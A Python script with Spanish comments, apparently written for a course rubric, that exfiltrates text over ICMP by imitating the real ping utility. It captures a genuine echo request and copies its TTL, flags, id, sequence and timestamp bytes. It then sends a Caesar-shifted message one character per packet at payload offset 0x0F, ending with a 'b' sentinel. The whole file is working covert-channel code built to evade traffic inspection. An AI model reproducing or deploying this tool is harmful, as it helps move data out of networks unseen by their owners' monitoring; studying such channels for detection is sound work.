#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
stealth_ping.py — Exfiltración ICMP "stealth" por carácter imitando /bin/ping.

REQUISITOS: sudo/root + scapy (`pip install scapy`)
EJEMPLOS:
  # 1) En una terminal, envía un ping real (para capturar el template):
  #    ping -c 1 8.8.8.8
  # 2) En otra terminal, corre este script para exfiltrar:
  sudo python3 stealth_ping.py --dst 8.8.8.8 --message "mensaje secreto" --shift 3

CARACTERÍSTICAS PARA CUMPLIR LA RÚBRICA:
- Mantiene ICMP.id y secuencia coherente respecto del ping "template".
- Preserva TTL/IP flags del template para asemejarse al ping real.
- Mantiene los primeros 8 bytes del payload (timestamp del ping) exactamente como el template.
- Mantiene inalterado el bloque de payload [0x10 .. 0x37] del template.
- Inyecta UN carácter cifrado por paquete en offset 0x0F (15) del payload.
- El último carácter SIEMPRE se transmite como 'b' (sentinela de fin).

CONSEJO: captura con Wireshark: `icmp && ip.dst == <dst>` y compara antes/después.
"""
import os, sys, time, struct, argparse
from typing import Optional, List
from scapy.all import IP, ICMP, Raw, send, sniff, conf  # type: ignore
from caesar import caesar

INJECT_OFFSET = 0x0F  # (15) — deja [0x10..0x37] intacto

def wait_ping_template(dst: str, timeout: int = 15):
    flt = f"icmp and host {dst}"
    print(f"[i] Esperando 1 ping real a {dst} para usar como template... (timeout {timeout}s)")
    pkts = sniff(filter=flt, count=1, timeout=timeout)
    if not pkts:
        raise RuntimeError("No se observó ningún ping real. Ejecuta `ping -c 1 {dst}` en otra terminal.")
    p = pkts[0]
    if not (ICMP in p and p[ICMP].type == 8):
        raise RuntimeError("El paquete capturado no es ICMP Echo Request.")
    print("[✓] Template capturado.")
    return p

def build_payload(base_payload: bytes, ch: str) -> bytes:
    # Asegura longitud suficiente (al menos 56 bytes de data típicos)
    data = bytearray(base_payload)
    if len(data) < 56:
        data.extend(b"\x00" * (56 - len(data)))
    # Mantener primeros 8 bytes intactos (timestamp) y [0x10..0x37] intactos.
    # Insertar/solapar solo el byte en offset 0x0F con el carácter deseado.
    data[INJECT_OFFSET] = ord(ch) & 0xFF
    return bytes(data)

def main(argv: List[str]) -> int:
    parser = argparse.ArgumentParser(description="Exfiltra texto por ICMP imitando ping.")
    parser.add_argument("--dst", required=True, help="Destino (IP o hostname)")
    parser.add_argument("--message", required=True, help="Mensaje en claro a exfiltrar")
    parser.add_argument("--shift", "-k", type=int, default=3, help="Corrimiento César (para cifrar antes de enviar)")
    parser.add_argument("--iface", help="Interfaz de red (opcional)")
    parser.add_argument("--pps", type=float, default=3.0, help="Paquetes por segundo (throttle)")
    args = parser.parse_args(argv)

    if args.iface:
        conf.iface = args.iface

    # 1) Captura un ping real (template) para clonar campos.
    tmpl = wait_ping_template(args.dst)

    ip_ttl = int(tmpl[IP].ttl)
    ip_flags = int(tmpl[IP].flags)
    icmp_id = int(tmpl[ICMP].id)
    icmp_seq0 = int(tmpl[ICMP].seq)
    base_payload = bytes(tmpl[ICMP].payload.load) if Raw in tmpl else b"\x00" * 56

    # 2) Prepara mensaje: cifra con César y agrega sentinela 'b' al final SIN cifrar.
    cipher = caesar(args.message, args.shift, mode="encrypt")
    to_send = list(cipher) + ['b']

    print(f"[i] Enviando {len(to_send)} paquetes ICMP a {args.dst} (1 char/paquete).")
    for i, ch in enumerate(to_send):
        payload = build_payload(base_payload, ch)
        pkt = IP(dst=args.dst, ttl=ip_ttl, flags=ip_flags) / ICMP(type=8, code=0, id=icmp_id, seq=icmp_seq0 + i) / Raw(payload)
        send(pkt, verbose=False)
        print(f"  - seq={icmp_seq0 + i:04d} char='{ch}' ({ord(ch):02x})")
        time.sleep(1.0 / max(args.pps, 0.1))

    print("[✓] Listo. Capture con Wireshark para evidencias (campos, payload, id/seq coherentes).")
    return 0

if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
